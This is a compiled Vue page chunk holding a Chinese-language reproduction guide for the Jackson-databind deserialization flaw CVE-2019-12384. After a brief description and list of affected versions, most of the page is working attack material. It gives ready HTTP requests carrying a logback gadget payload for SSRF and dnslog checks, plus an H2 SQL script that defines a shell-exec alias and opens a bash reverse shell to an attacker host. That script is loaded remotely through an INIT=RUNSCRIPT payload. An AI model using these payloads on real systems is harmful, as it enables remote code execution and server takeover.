import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as s,e}from"./app-58e4a7d6.js";const t={},i=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>多个 Redhat 产品受此漏洞影响，CVSS 评分为 8.1，漏洞利用复杂度高。</p><p>该漏洞是由于 Jackson 黑名单过滤不完整而导致，当开发人员在应用程序中通过 ObjectMapper 对象调用 enableDefaultTyping 方法时，程序就会受到此漏洞的影响，攻击者就可利用构造的包含有恶意代码的 json 数据包对应用进行攻击，直接获取服务器控制权限。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>受影响版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Jackson-databind 2.X &lt; 2.9.9.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>不受影响版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Jackson-databind 2.9.9.1
Jackson-databind 2.10
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="ssrf" tabindex="-1"><a class="header-anchor" href="#ssrf" aria-hidden="true">#</a> SSRF</h3><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /fuckme HTTP/1.1
Host: 192.168.136.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

poc=[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:tcp://192.168.136.129:7777/&quot;}]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>或者直接使用 dnslog 验证：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>poc=[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:tcp://jcqfpe.dnslog.cn/&quot;}]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="rce" tabindex="-1"><a class="header-anchor" href="#rce" aria-hidden="true">#</a> RCE</h3><p>首先在 vps 上放置一个.sql 的文件，内容如下：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">CREATE</span> ALIAS SHELLEXEC <span class="token keyword">AS</span> $ String shellexec<span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> throws java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException {
        String<span class="token punctuation">[</span><span class="token punctuation">]</span> command <span class="token operator">=</span> {<span class="token string">&quot;bash&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> cmd}<span class="token punctuation">;</span>
        java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner s <span class="token operator">=</span> new java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>useDelimiter<span class="token punctuation">(</span><span class="token string">&quot;\\\\A&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> s<span class="token punctuation">.</span>hasNext<span class="token punctuation">(</span><span class="token punctuation">)</span> ? s<span class="token punctuation">.</span><span class="token keyword">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> : <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>  }
$<span class="token punctuation">;</span>
<span class="token keyword">CALL</span> SHELLEXEC<span class="token punctuation">(</span><span class="token string">&#39;bash -i &gt;&amp; /dev/tcp/192.168.136.129/7777 0&gt;&amp;1&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后发送 payload，请求远程的 sql 文件，进行 RCE</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /fuckme HTTP/1.1
Host: 192.168.136.131:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 164

poc=[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://192.168.136.129/exp.sql&#39;&quot;}]

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,18),c=[i];function o(l,p){return a(),s("div",null,c)}const r=n(t,[["render",o],["__file","Jackson-databind远程代码执行 CVE-2019-12384.html.vue"]]);export{r as default};
